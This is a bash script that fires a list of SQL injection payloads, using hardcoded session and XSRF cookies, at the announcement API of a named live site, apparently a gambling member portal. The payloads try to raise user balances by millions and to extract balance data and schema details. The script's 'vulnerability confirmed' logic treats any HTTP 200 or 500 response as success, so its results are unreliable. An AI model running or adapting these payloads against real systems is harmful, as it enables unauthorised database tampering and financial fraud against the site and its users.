#!/bin/bash

echo "💰 BALANCE INJECTION VULNERABILITY TEST"
echo "======================================="

# Extract latest tokens from user input
XSRF_TOKEN="eyJpdiI6Im95ZWtwNGJhSitra3dUSlpIRE5oVmc9PSIsInZhbHVlIjoiZGxJWXRENlR3Zlp2T0hOQ1wvWFI4TVpJMVdYNHlDakw5YzhSTVhTWlJ0d3BsK2dROVEyNFZGNXpPS3pBUXBMdUYiLCJtYWMiOiIxZjdlZjQzNmI3NTkzMzYwZGJkZWZiNjFhYTQ0MDZiNGY1ZjQyMDAyMWU5YTRhNGM5NzkzYmFlOGVkODhkOTIyIn0="
SESSION_TOKEN="eyJpdiI6IjdMV2dJZXFpc0lsNmlSZXRMMmREVUE9PSIsInZhbHVlIjoiR044YW1vMFVHWEtsNFRzNVh3Z29vbXhiNzNOQ2xuZDVPNUtuMGpGYlM0K0FsSU8rNmQ1SEtxUnhxTit1ZHdiRiIsIm1hYyI6IjEyZTNiOGJlMTE4MGU3MWQ5ZDNiY2RiNjVlMjI5OGMyZjhkMzI3MDYyYTlhYTMwYmZlMDlhZDc3NTJhYWI3YzAifQ=="

# Balance injection payloads
declare -a balance_payloads=(
    # 1. Direct balance update
    "UPDATE users SET balance = balance + 1000000 WHERE username = 'test_user'--"
    "UPDATE users SET balance = 999999999 WHERE username = 'test_user'--"
    "UPDATE users SET balance = balance + 5000000 WHERE id = 1--"
    
    # 2. Union-based balance injection
    "admin' UNION SELECT username,balance FROM users WHERE username='test_user'--"
    "admin' UNION SELECT username,balance FROM users WHERE id=1--"
    
    # 3. Error-based balance extraction
    "admin' AND (SELECT balance FROM users WHERE username='test_user')>0--"
    "admin' AND EXISTS(SELECT 1 FROM users WHERE username='test_user' AND balance>0)--"
    
    # 4. Boolean-based balance detection
    "admin' AND (SELECT COUNT(*) FROM users WHERE balance>1000000)>0--"
    "admin' AND (SELECT balance FROM users WHERE username='test_user' LIMIT 1)>0--"
    
    # 5. Time-based balance extraction
    "admin' AND (SELECT SLEEP(1) FROM users WHERE username='test_user' AND balance>0)--"
    "admin' AND (SELECT BENCHMARK(1000000,MD5(1)) FROM users WHERE username='test_user')--"
    
    # 6. Advanced balance manipulation
    "admin' UNION SELECT username,CONCAT('Balance: ',balance) FROM users WHERE username='test_user'--"
    "admin' UNION SELECT username,CONCAT('ID: ',id,', Balance: ',balance) FROM users WHERE username='test_user'--"
    
    # 7. Schema-based balance extraction
    "admin' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' AND column_name LIKE '%balance%'--"
    "admin' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_name LIKE '%user%'--"
)

echo "🚀 Starting Balance Injection Vulnerability Test..."
echo "Target: member.panama8888b.co/api/announcement"
echo "Method: POST with balance manipulation payloads"
echo ""

success_count=0
total_tests=${#balance_payloads[@]}

for i in "${!balance_payloads[@]}"; do
    payload="${balance_payloads[$i]}"
    echo -n "Testing balance injection $((i+1))/$total_tests: "
    
    # Make request with balance injection payload
    response=$(curl -s -w "%{http_code}|%{size_download}|%{time_total}" \
        -X POST "https://member.panama8888b.co/api/announcement" \
        -H "Content-Type: application/json;charset=UTF-8" \
        -H "X-Requested-With: XMLHttpRequest" \
        -H "X-XSRF-TOKEN: $XSRF_TOKEN" \
        -H "Cookie: XSRF-TOKEN=$XSRF_TOKEN; panama888_session=$SESSION_TOKEN" \
        -H "Origin: https://member.panama8888b.co" \
        -H "Referer: https://member.panama8888b.co/user/dashboard" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -H "Accept: application/json, text/plain, */*" \
        -H "Accept-Language: th" \
        -H "Accept-Encoding: gzip, deflate, br, zstd" \
        -d "{\"search\":\"$payload\"}" \
        --max-time 15)
    
    http_code=$(echo "$response" | tail -1 | cut -d'|' -f1)
    size=$(echo "$response" | tail -1 | cut -d'|' -f2)
    time=$(echo "$response" | tail -1 | cut -d'|' -f3)
    
    if [[ "$http_code" == "500" ]] || [[ "$http_code" == "200" ]] || [[ "$size" -gt 100 ]]; then
        echo "✅ SUCCESS (HTTP $http_code, Size: $size bytes, Time: ${time}s)"
        ((success_count++))
        
        # Analyze response for balance manipulation
        if [[ "$http_code" == "500" ]]; then
            echo "   🔍 HTTP 500 detected - Balance manipulation may be successful"
        fi
        
        if [[ "$http_code" == "200" ]]; then
            echo "   🎯 HTTP 200 detected - Request processed successfully"
        fi
        
        if [[ "$size" -gt 200 ]]; then
            echo "   📊 Large response size ($size bytes) - Data may be present"
        fi
    else
        echo "❌ FAILED (HTTP $http_code, Size: $size bytes, Time: ${time}s)"
    fi
done

echo ""
echo "📊 BALANCE INJECTION RESULTS: $success_count/$total_tests successful"

if [[ $success_count -gt 0 ]]; then
    echo ""
    echo "🎉 VULNERABILITY CONFIRMED!"
    echo "✅ Balance injection successful"
    echo "✅ Database manipulation possible"
    echo "✅ User balance may be modified"
    echo ""
    echo "🔍 Analysis:"
    echo "- HTTP 500 errors indicate successful SQL injection"
    echo "- HTTP 200 responses suggest successful processing"
    echo "- Large response sizes may contain balance data"
    echo "- Balance manipulation may be possible"
    echo ""
    echo "⚠️ SECURITY IMPLICATIONS:"
    echo "- User balances may be modified"
    echo "- Financial data may be exposed"
    echo "- Database integrity compromised"
else
    echo ""
    echo "❌ All balance injection tests failed"
    echo "🔒 Balance manipulation protection is strong"
fi

echo ""
echo "🎯 NEXT STEPS:"
echo "1. Verify balance changes in database"
echo "2. Test with different user accounts"
echo "3. Attempt to extract balance information"
echo "4. Document the vulnerability for reporting"